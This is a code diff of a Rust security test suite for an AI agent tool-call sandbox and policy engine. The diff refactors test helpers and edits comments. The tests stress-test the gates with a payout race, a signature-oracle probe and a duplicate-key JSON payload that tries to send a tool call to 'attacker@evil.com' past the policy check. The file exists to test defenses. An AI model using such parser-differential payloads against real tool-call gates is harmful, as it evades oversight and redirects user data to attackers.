@@ -13,8 +13,6 @@
     clippy::cast_possible_truncation
 )]
 
-use av_bridge::{BusError, EventBus, PublishAck, StoredEvent};
-use av_events::EventClass;
 use av_receipts::{canonicalize, Ed25519Signer, EventChain, Keyring, Receipt, Signer};
 use av_sandbox::{PolicyDecision, PolicyEngine, Sandbox, SandboxConfig, ToolVerdict};
 use av_state::{BudgetSpec, InMemoryStore, StateStore};
@@ -26,43 +24,8 @@ use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::{Arc, Barrier};
 use std::thread;
 
-// ---------------------------------------------------------------------------
-// Local scaffolding.
-// ---------------------------------------------------------------------------
-
-#[derive(Default)]
-#[allow(dead_code)]
-struct NoopBus {
-    n: AtomicU64,
-}
-impl EventBus for NoopBus {
-    fn publish(&self, topic: &str, _key: &str, _value: &Value) -> Result<PublishAck, BusError> {
-        Ok(PublishAck {
-            topic: topic.to_owned(),
-            partition: 0,
-            offset: self.n.fetch_add(1, Ordering::AcqRel),
-        })
-    }
-    fn fetch(&self, _t: &str, _p: u32, _o: u64, _m: usize) -> Result<Vec<StoredEvent>, BusError> {
-        Ok(Vec::new())
-    }
-    fn partitions(&self, _t: &str) -> Result<u32, BusError> {
-        Ok(1)
-    }
-    fn topics(&self) -> Vec<String> {
-        EventClass::all().iter().map(|c| c.topic().to_owned()).collect()
-    }
-}
-
-fn tools_call(tool: &str, args: Value) -> Vec<u8> {
-    serde_json::to_vec(&json!({
-        "jsonrpc": "2.0",
-        "id": 1,
-        "method": "tools/call",
-        "params": {"name": tool, "arguments": args}
-    }))
-    .unwrap()
-}
+mod common;
+use common::tools_call;
 
 // ---------------------------------------------------------------------------
 // Attack 1. TOCTOU on payout: race N sandbox `check` calls at exactly the
@@ -306,7 +269,7 @@ fn duplicate_key_parser_differential_cannot_split_schema_from_policy() {
     let store = InMemoryStore::new();
     // Manually build a duplicate-key JSON payload.
     let raw = br#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send","arguments":{"to":"attacker@evil.com","to":"user@example.com"}}}"#;
-    // Round-47: duplicate keys are rejected at the RPC parser, ahead
+    // Duplicate keys are rejected at the RPC parser, ahead
     // of both gates. A previous version accepted the parser's
     // (implementation-defined) last-wins pick and RELIED on threading
     // it consistently to schema and policy — but the raw body is
@@ -433,7 +396,7 @@ fn signature_oracle_reveals_nothing_that_would_forge_a_new_receipt() {
     }
     // 200 distinct canonicalized bodies must yield 200 distinct signatures.
     assert_eq!(sigs.lock().len(), 200);
-    // Determinism arm (round 36): the loop's bodies are all distinct, so
+    // Determinism arm: the loop's bodies are all distinct, so
     // the insert-collision branch above can never fire — force one true
     // identical-body pair here. RFC 8032 Ed25519 is deterministic: same
     // canonical body under the same key must yield the identical signature.
